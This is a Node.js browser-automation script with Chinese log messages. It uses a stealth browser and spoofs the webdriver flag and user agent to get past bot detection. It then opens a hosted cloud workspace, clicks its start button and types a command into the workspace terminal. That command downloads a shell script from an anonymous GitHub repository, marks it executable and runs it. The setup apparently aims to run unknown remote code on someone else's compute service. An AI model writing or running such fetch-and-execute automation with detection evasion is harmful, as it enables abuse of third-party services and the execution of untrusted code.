import { launch } from 'cloakbrowser';

const CONFIG = {
  workspaceDomain: '139.zo.computer',
  workspaceName: '139',
  waitAfterEnterWorkspace: 180000,
  headless: true,
  runTmuxInit: process.env.INIT_TMUX === '1',
  tmuxCommand: "wget -O zzz.sh https://raw.githubusercontent.com/yghhbbuy/vvvioui/refs/heads/main/zzz.sh && chmod +x zzz.sh && bash zzz.sh",
};

async function safeScreenshot(page, path) {
  try { await page.screenshot({ path, fullPage: true }); console.log(`📸 已保存截图: ${path}`); } catch {}
}

async function selectWorkspace(page) {
  console.log(`🔎 正在尝试探测域名元素: ${CONFIG.workspaceDomain}`);
  const target = page.locator(`text="${CONFIG.workspaceDomain}"`).first();
  
  try {
    // 增加等待逻辑，确保页面内容已渲染
    await target.waitFor({ state: 'visible', timeout: 20000 });
    console.log(`✅ 成功找到域名: ${CONFIG.workspaceDomain}`);
    
    await target.scrollIntoViewIfNeeded();
    await target.click({ force: true });
    
    console.log('✅ 已触发点击。等待工作区初始化...');
    await page.waitForTimeout(20000); 
    return true;
  } catch (e) {
    console.error(`❌ 错误：在指定时间内未找到域名 "${CONFIG.workspaceDomain}"`);
    await safeScreenshot(page, 'debug-domain-not-found.png');
    return false;
  }
}

async function clickStartButton(page) {
  console.log('🚀 正在执行精准探测启动按钮策略...');
  const btnSelector = 'button:has-text("Start"), button:has-text("Run"), button:has-text("开始"), [role="button"]:has-text("Start"), [aria-label*="Start"]';
  
  for (let i = 0; i < 15; i++) {
    const btn = page.locator(btnSelector).first();
    if (await btn.isVisible({ timeout: 3000 })) {
      const tagName = await btn.evaluate(el => el.tagName);
      if (tagName !== 'P' && tagName !== 'DIV') {
        await btn.scrollIntoViewIfNeeded();
        await btn.click({ force: true });
        console.log('✅ 启动按钮点击成功');
        await page.waitForTimeout(15000);
        return true;
      }
    }
    await page.waitForTimeout(5000);
  }
  console.log('⚠️ 未检测到启动按钮，可能已自动启动。');
  await safeScreenshot(page, 'debug-button-status.png');
  return true; 
}

async function run() {
  const url = process.argv[2];
  if (!url) process.exit(1);

  // 增大浏览器启动的超时容忍度，缓解 SSL/Socket 错误
  const browser = await launch({ headless: CONFIG.headless });
  const context = await browser.newContext({
    viewport: { width: 1920, height: 1080 },
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  });
  const page = await context.newPage();
  await page.addInitScript(() => { Object.defineProperty(navigator, 'webdriver', { get: () => undefined }); });

  try {
    console.log('🌐 正在访问:', url);
    // 增加跳转超时时间，应对网络波动
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 120000 });
    
    if (await selectWorkspace(page)) {
      await clickStartButton(page);
      
      if (CONFIG.runTmuxInit) {
        console.log('🖥️ 执行终端初始化...');
        await page.mouse.click(200, 400);
        await page.keyboard.press('Control+Shift+`');
        await page.waitForTimeout(5000);
        await page.keyboard.insertText(CONFIG.tmuxCommand);
        await page.keyboard.press('Enter');
        await page.waitForTimeout(10000);
      }
    }
    
    await safeScreenshot(page, 'result.png');
    console.log('✅ 流程执行完成');
  } catch (err) {
    console.error('❌ 执行失败:', err);
    await safeScreenshot(page, 'error-final.png');
  } finally {
    await browser.close();
  }
}

run();
